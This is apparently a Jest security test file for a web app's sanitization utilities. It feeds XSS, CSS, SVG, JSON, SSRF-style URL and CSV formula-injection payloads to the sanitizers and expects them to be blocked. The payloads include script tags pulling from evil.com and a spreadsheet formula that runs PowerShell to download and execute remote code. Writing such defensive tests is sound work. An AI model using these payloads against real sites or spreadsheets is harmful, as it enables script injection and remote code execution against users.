/**
 * Advanced Security Tests
 * 
 * Comprehensive security tests for XSS prevention, input sanitization,
 * and advanced attack vectors in enhanced content rendering.
 */

import {
  validateAndSanitizeURL,
  sanitizeHTML,
  sanitizeWidgetCode,
  sanitizeChartData,
  XSSPrevention,
} from '../utils/SecurityUtils';

// Mock DOM APIs for comprehensive testing
const createMockElement = () => ({
  textContent: '',
  innerHTML: '',
  set textContent(value: string) {
    this.innerHTML = value
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  },
  get innerHTML() {
    return this._innerHTML || '';
  },
  set innerHTML(value: string) {
    this._innerHTML = value;
  },
});

Object.defineProperty(global, 'document', {
  value: {
    createElement: jest.fn(() => createMockElement()),
  },
  writable: true,
});

describe('Advanced Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Advanced XSS Attack Vectors', () => {
    describe('Script Injection Variants', () => {
      const scriptVariants = [
        '<script>alert("xss")</script>',
        '<SCRIPT>alert("xss")</SCRIPT>',
        '<script type="text/javascript">alert("xss")</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>eval("alert(\\"xss\\")")</script>',
        '<script>window["eval"]("alert(\\"xss\\")")</script>',
        '<script>setTimeout("alert(\\"xss\\")", 100)</script>',
        '<script>setInterval("alert(\\"xss\\")", 100)</script>',
        '<script>Function("alert(\\"xss\\")")()</script>',
        '<script>\nalert("xss")\n</script>',
        '<script\n>alert("xss")</script>',
        '<script >alert("xss")</script>',
        '<<script>alert("xss")</script>',
        '<script><![CDATA[alert("xss")]]></script>',
      ];

      scriptVariants.forEach((variant, index) => {
        it(`should block script injection variant ${index + 1}: ${variant.substring(0, 30)}...`, () => {
          const result = XSSPrevention.validateContent(variant);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('dangerous pattern');
        });
      });
    });

    describe('Event Handler Injection', () => {
      const eventHandlers = [
        'onclick="alert(\\"xss\\")"',
        'onload="alert(\\"xss\\")"',
        'onerror="alert(\\"xss\\")"',
        'onmouseover="alert(\\"xss\\")"',
        'onfocus="alert(\\"xss\\")"',
        'onblur="alert(\\"xss\\")"',
        'onchange="alert(\\"xss\\")"',
        'onsubmit="alert(\\"xss\\")"',
        'onkeydown="alert(\\"xss\\")"',
        'onkeyup="alert(\\"xss\\")"',
        'onresize="alert(\\"xss\\")"',
        'onscroll="alert(\\"xss\\")"',
        'ontouchstart="alert(\\"xss\\")"',
        'onanimationend="alert(\\"xss\\")"',
        'ontransitionend="alert(\\"xss\\")"',
      ];

      eventHandlers.forEach((handler) => {
        it(`should block event handler: ${handler}`, () => {
          const html = `<div ${handler}>Content</div>`;
          const result = XSSPrevention.validateContent(html);
          expect(result.isValid).toBe(false);
        });
      });
    });

    describe('JavaScript URL Schemes', () => {
      const jsUrls = [
        'javascript:alert("xss")',
        'JAVASCRIPT:alert("xss")',
        'javascript://comment%0aalert("xss")',
        'javascript:void(0);alert("xss")',
        'javascript:eval("alert(\\"xss\\")")',
        'javascript:window.location="http://evil.com"',
        'javascript:document.cookie',
        'javascript:localStorage.clear()',
        'javascript:sessionStorage.clear()',
        'javascript:history.back()',
        'vbscript:msgbox("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=',
      ];

      jsUrls.forEach((url) => {
        it(`should block JavaScript URL: ${url}`, () => {
          const result = validateAndSanitizeURL(url);
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('not allowed');
        });
      });
    });

    describe('HTML Entity Encoding Bypasses', () => {
      const entityBypassAttempts = [
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        '&#60;script&#62;alert("xss")&#60;/script&#62;',
        '&#x3C;script&#x3E;alert("xss")&#x3C;/script&#x3E;',
        '&amp;lt;script&amp;gt;alert("xss")&amp;lt;/script&amp;gt;',
        '\\u003cscript\\u003ealert("xss")\\u003c/script\\u003e',
        '\\x3cscript\\x3ealert("xss")\\x3c/script\\x3e',
      ];

      entityBypassAttempts.forEach((attempt) => {
        it(`should handle entity bypass attempt: ${attempt.substring(0, 30)}...`, () => {
          const sanitized = sanitizeHTML(attempt);
          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('alert(');
        });
      });
    });

    describe('CSS-based Attacks', () => {
      const cssAttacks = [
        '<style>body{background:url("javascript:alert(\\"xss\\")")}</style>',
        '<div style="background:url(javascript:alert(\\"xss\\"))">Content</div>',
        '<div style="expression(alert(\\"xss\\"))">Content</div>',
        '<div style="behavior:url(xss.htc)">Content</div>',
        '<div style="@import url(javascript:alert(\\"xss\\"))">Content</div>',
        '<link rel="stylesheet" href="javascript:alert(\\"xss\\")">',
      ];

      cssAttacks.forEach((attack) => {
        it(`should block CSS attack: ${attack.substring(0, 50)}...`, () => {
          const result = XSSPrevention.validateContent(attack);
          expect(result.isValid).toBe(false);
        });
      });
    });

    describe('SVG-based Attacks', () => {
      const svgAttacks = [
        '<svg onload="alert(\\"xss\\")">',
        '<svg><script>alert("xss")</script></svg>',
        '<svg><foreignObject><script>alert("xss")</script></foreignObject></svg>',
        '<svg><use href="javascript:alert(\\"xss\\")"></use></svg>',
        '<svg><animate onbegin="alert(\\"xss\\")"></animate></svg>',
      ];

      svgAttacks.forEach((attack) => {
        it(`should block SVG attack: ${attack.substring(0, 50)}...`, () => {
          const result = XSSPrevention.validateContent(attack);
          expect(result.isValid).toBe(false);
        });
      });
    });
  });

  describe('Widget Code Sanitization Advanced Tests', () => {
    describe('React Code Injection', () => {
      it('should remove dangerous React patterns', () => {
        const dangerousCode = `
          import React from 'react';
          
          const Component = () => {
            // Dangerous patterns
            const html = "<script>alert('xss')</script>";
            const evalCode = eval("alert('xss')");
            const funcCode = new Function("alert('xss')")();
            
            React.useEffect(() => {
              document.body.innerHTML = userInput;
              window.location = "http://evil.com";
            }, []);
            
            return (
              <div 
                dangerouslySetInnerHTML={{__html: userInput}}
                onClick={() => eval(userInput)}
              >
                <script>alert('xss')</script>
              </div>
            );
          };
        `;

        const sanitized = sanitizeWidgetCode(dangerousCode, 'react');
        
        expect(sanitized).toContain('/* REMOVED FOR SECURITY */');
        expect(sanitized).not.toContain('dangerouslySetInnerHTML');
        expect(sanitized).not.toContain('eval(');
        expect(sanitized).not.toContain('Function(');
        expect(sanitized).not.toContain('document.');
        expect(sanitized).not.toContain('window.');
        expect(sanitized).not.toContain('<script>');
      });

      it('should preserve safe React patterns', () => {
        const safeCode = `
          import React, { useState, useEffect } from 'react';
          
          const SafeComponent = () => {
            const [count, setCount] = useState(0);
            
            useEffect(() => {
              console.log('Component mounted');
            }, []);
            
            const handleClick = () => {
              setCount(count + 1);
            };
            
            return (
              <div>
                <h1>Count: {count}</h1>
                <button onClick={handleClick}>Increment</button>
              </div>
            );
          };
        `;

        const sanitized = sanitizeWidgetCode(safeCode, 'react');
        
        expect(sanitized).toContain('useState');
        expect(sanitized).toContain('useEffect');
        expect(sanitized).toContain('console.log');
        expect(sanitized).toContain('onClick={handleClick}');
        expect(sanitized).not.toContain('/* REMOVED FOR SECURITY */');
      });
    });

    describe('HTML Code Injection', () => {
      it('should remove dangerous HTML elements and attributes', () => {
        const dangerousHtml = `
          <div>
            <h1>Safe Content</h1>
            <script>alert('xss')</script>
            <iframe src="http://evil.com"></iframe>
            <object data="evil.swf"></object>
            <embed src="evil.swf">
            <form action="http://evil.com">
              <input type="text" name="data">
            </form>
            <div onclick="alert('xss')">Click me</div>
            <a href="javascript:alert('xss')">Link</a>
            <img src="x" onerror="alert('xss')">
            <style>body{background:url("javascript:alert('xss')")}</style>
            <link rel="stylesheet" href="javascript:alert('xss')">
          </div>
        `;

        const sanitized = sanitizeWidgetCode(dangerousHtml, 'html');
        
        expect(sanitized).toContain('<!-- REMOVED FOR SECURITY -->');
        expect(sanitized).toContain('<h1>Safe Content</h1>');
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<object');
        expect(sanitized).not.toContain('<embed');
        expect(sanitized).not.toContain('<form');
        expect(sanitized).not.toContain('onclick=');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
      });

      it('should preserve safe HTML elements', () => {
        const safeHtml = `
          <div class="container">
            <h1>Title</h1>
            <p>Paragraph with <strong>bold</strong> and <em>italic</em> text.</p>
            <ul>
              <li>Item 1</li>
              <li>Item 2</li>
            </ul>
            <img src="safe-image.jpg" alt="Safe image">
            <a href="https://safe-site.com">Safe link</a>
            <button type="button">Safe button</button>
          </div>
        `;

        const sanitized = sanitizeWidgetCode(safeHtml, 'html');
        
        expect(sanitized).toContain('<div class="container">');
        expect(sanitized).toContain('<h1>Title</h1>');
        expect(sanitized).toContain('<strong>bold</strong>');
        expect(sanitized).toContain('<em>italic</em>');
        expect(sanitized).toContain('<ul>');
        expect(sanitized).toContain('<li>');
        expect(sanitized).toContain('href="https://safe-site.com"');
        expect(sanitized).not.toContain('<!-- REMOVED FOR SECURITY -->');
      });
    });
  });

  describe('Chart Data Sanitization Advanced Tests', () => {
    describe('JSON Injection Attacks', () => {
      it('should remove function properties from JSON', () => {
        const maliciousJson = JSON.stringify({
          labels: ['A', 'B', 'C'],
          datasets: [{
            label: 'Data',
            data: [1, 2, 3],
            onClick: 'function() { alert("xss"); }',
            onHover: 'eval("alert(\\"xss\\")")',
            callback: 'new Function("alert(\\"xss\\")")',
          }],
          options: {
            onClick: 'function() { window.location = "http://evil.com"; }',
            plugins: {
              tooltip: {
                callbacks: {
                  label: 'function() { document.cookie = ""; }'
                }
              }
            }
          }
        });

        const result = sanitizeChartData(maliciousJson);
        expect(result.isValid).toBe(true);
        
        const parsed = JSON.parse(result.sanitizedData!);
        expect(parsed.datasets[0].onClick).toBeNull();
        expect(parsed.datasets[0].onHover).toBeNull();
        expect(parsed.datasets[0].callback).toBeNull();
        expect(parsed.options.onClick).toBeNull();
      });

      it('should handle deeply nested malicious properties', () => {
        const deepMaliciousJson = JSON.stringify({
          data: {
            nested: {
              deep: {
                callback: 'alert("xss")',
                handler: 'eval("malicious")',
                func: 'new Function("evil")'
              }
            }
          }
        });

        const result = sanitizeChartData(deepMaliciousJson);
        expect(result.isValid).toBe(true);
        
        const parsed = JSON.parse(result.sanitizedData!);
        expect(parsed.data.nested.deep.callback).toBeNull();
        expect(parsed.data.nested.deep.handler).toBeNull();
        expect(parsed.data.nested.deep.func).toBeNull();
      });
    });

    describe('CSV Injection Attacks', () => {
      it('should sanitize malicious CSV content', () => {
        const maliciousCsv = `
Name,Value,Script
Product A,100,<script>alert('xss')</script>
Product B,200,"=cmd|'/c calc'!A1"
Product C,300,@SUM(1+1)*cmd|'/c calc'!A1
Product D,400,+cmd|'/c calc'!A1
Product E,500,-cmd|'/c calc'!A1
        `.trim();

        const result = sanitizeChartData(maliciousCsv);
        expect(result.isValid).toBe(true);
        expect(result.sanitizedData).not.toContain('<script>');
        expect(result.sanitizedData).not.toContain('=cmd');
        expect(result.sanitizedData).not.toContain('@SUM');
        expect(result.sanitizedData).not.toContain('+cmd');
        expect(result.sanitizedData).not.toContain('-cmd');
      });

      it('should handle CSV formula injection', () => {
        const formulaInjectionCsv = `
Category,Formula
Test1,"=1+1"
Test2,"=HYPERLINK(""http://evil.com"",""Click me"")"
Test3,"=cmd|'/c powershell IEX(wget 0r.pe/p)'!A0"
        `.trim();

        const result = sanitizeChartData(formulaInjectionCsv);
        expect(result.isValid).toBe(true);
        expect(result.sanitizedData).not.toContain('=HYPERLINK');
        expect(result.sanitizedData).not.toContain('powershell');
        expect(result.sanitizedData).not.toContain('wget');
      });
    });
  });

  describe('URL Validation Advanced Tests', () => {
    describe('Protocol Confusion Attacks', () => {
      const protocolAttacks = [
        'http://evil.com\\@good.com/image.jpg',
        'https://good.com@evil.com/image.jpg',
        'https://good.com.evil.com/image.jpg',
        'https://good-com.evil.com/image.jpg',
        'https://127.0.0.1/image.jpg',
        'https://localhost/image.jpg',
        'https://[::1]/image.jpg',
        'https://0x7f000001/image.jpg',
        'https://2130706433/image.jpg', // 127.0.0.1 in decimal
        'file:///etc/passwd',
        'ftp://evil.com/image.jpg',
        'gopher://evil.com/image.jpg',
        'ldap://evil.com/image.jpg',
      ];

      protocolAttacks.forEach((url) => {
        it(`should block protocol attack: ${url}`, () => {
          const result = validateAndSanitizeURL(url);
          expect(result.isValid).toBe(false);
        });
      });
    });

    describe('Domain Validation Edge Cases', () => {
      it('should handle internationalized domain names', () => {
        const idnUrls = [
          'https://xn--e1afmkfd.xn--p1ai/image.jpg', // пример.рф
          'https://测试.中国/image.jpg',
          'https://テスト.日本/image.jpg',
        ];

        idnUrls.forEach((url) => {
          const result = validateAndSanitizeURL(url);
          // Should handle IDN domains appropriately
          expect(result).toBeDefined();
        });
      });

      it('should validate port numbers', () => {
        const portUrls = [
          'https://example.com:443/image.jpg', // Standard HTTPS port
          'https://example.com:8443/image.jpg', // Common alternative
          'https://example.com:65535/image.jpg', // Max port
          'https://example.com:0/image.jpg', // Invalid port
          'https://example.com:99999/image.jpg', // Invalid port
        ];

        portUrls.forEach((url) => {
          const result = validateAndSanitizeURL(url);
          // Should validate port ranges appropriately
          expect(result).toBeDefined();
        });
      });
    });

    describe('Query Parameter Sanitization', () => {
      it('should remove dangerous query parameters', () => {
        const dangerousUrl = 'https://example.com/image.jpg?callback=evil&jsonp=malicious&eval=bad&function=dangerous&script=xss&normal=ok';
        const result = validateAndSanitizeURL(dangerousUrl);
        
        if (result.isValid) {
          expect(result.sanitizedUrl).not.toContain('callback=');
          expect(result.sanitizedUrl).not.toContain('jsonp=');
          expect(result.sanitizedUrl).not.toContain('eval=');
          expect(result.sanitizedUrl).not.toContain('function=');
          expect(result.sanitizedUrl).not.toContain('script=');
          expect(result.sanitizedUrl).toContain('normal=ok');
        }
      });

      it('should handle URL-encoded dangerous parameters', () => {
        const encodedUrl = 'https://example.com/image.jpg?%63%61%6c%6c%62%61%63%6b=evil'; // callback=evil
        const result = validateAndSanitizeURL(encodedUrl);
        
        if (result.isValid) {
          expect(result.sanitizedUrl).not.toContain('callback');
          expect(result.sanitizedUrl).not.toContain('%63%61%6c%6c%62%61%63%6b');
        }
      });
    });
  });

  describe('Content Security Policy Compliance', () => {
    it('should generate CSP-compliant sanitized content', () => {
      const htmlContent = `
        <div>
          <h1>Title</h1>
          <p>Safe content</p>
          <script>alert('blocked')</script>
          <style>body { color: red; }</style>
        </div>
      `;

      const sanitized = sanitizeWidgetCode(htmlContent, 'html');
      
      // Should not contain inline scripts or styles that would violate CSP
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<style>');
      expect(sanitized).toContain('<h1>Title</h1>');
      expect(sanitized).toContain('<p>Safe content</p>');
    });

    it('should handle nonce-based CSP requirements', () => {
      const content = `
        <script nonce="random123">console.log('safe');</script>
        <script>alert('unsafe');</script>
        <style nonce="random456">body { color: blue; }</style>
        <style>body { color: red; }</style>
      `;

      const sanitized = sanitizeWidgetCode(content, 'html');
      
      // Should remove all scripts and styles regardless of nonce
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('<style');
    });
  });

  describe('Performance and DoS Protection', () => {
    it('should handle extremely large input without hanging', () => {
      const largeInput = 'A'.repeat(1000000) + '<script>alert("xss")</script>';
      
      const startTime = performance.now();
      const result = XSSPrevention.validateContent(largeInput);
      const endTime = performance.now();
      
      expect(endTime - startTime).toBeLessThan(1000); // Should complete in under 1 second
      expect(result.isValid).toBe(false);
    });

    it('should handle deeply nested HTML without stack overflow', () => {
      let deepHtml = '';
      for (let i = 0; i < 1000; i++) {
        deepHtml += '<div>';
      }
      deepHtml += '<script>alert("xss")</script>';
      for (let i = 0; i < 1000; i++) {
        deepHtml += '</div>';
      }

      const result = XSSPrevention.validateContent(deepHtml);
      expect(result.isValid).toBe(false);
    });

    it('should handle regex DoS attempts', () => {
      const regexDosAttempt = 'a'.repeat(10000) + '<script>alert("xss")</script>';
      
      const startTime = performance.now();
      const result = XSSPrevention.validateContent(regexDosAttempt);
      const endTime = performance.now();
      
      expect(endTime - startTime).toBeLessThan(500); // Should be fast
      expect(result.isValid).toBe(false);
    });
  });

  describe('Edge Case Input Handling', () => {
    it('should handle null and undefined inputs', () => {
      expect(() => sanitizeHTML(null as any)).not.toThrow();
      expect(() => sanitizeHTML(undefined as any)).not.toThrow();
      expect(() => sanitizeWidgetCode(null as any, 'react')).not.toThrow();
      expect(() => sanitizeChartData(null as any)).not.toThrow();
      expect(() => validateAndSanitizeURL(null as any)).not.toThrow();
    });

    it('should handle empty strings', () => {
      expect(sanitizeHTML('')).toBe('');
      expect(sanitizeWidgetCode('', 'react')).toBe('');
      
      const emptyUrlResult = validateAndSanitizeURL('');
      expect(emptyUrlResult.isValid).toBe(false);
      
      const emptyDataResult = sanitizeChartData('');
      expect(emptyDataResult.isValid).toBe(false);
    });

    it('should handle binary data', () => {
      const binaryData = String.fromCharCode(0, 1, 2, 3, 255);
      expect(() => sanitizeHTML(binaryData)).not.toThrow();
    });

    it('should handle malformed Unicode', () => {
      const malformedUnicode = '\uD800\uD800\uDC00'; // Malformed surrogate pair
      expect(() => sanitizeHTML(malformedUnicode)).not.toThrow();
    });
  });
});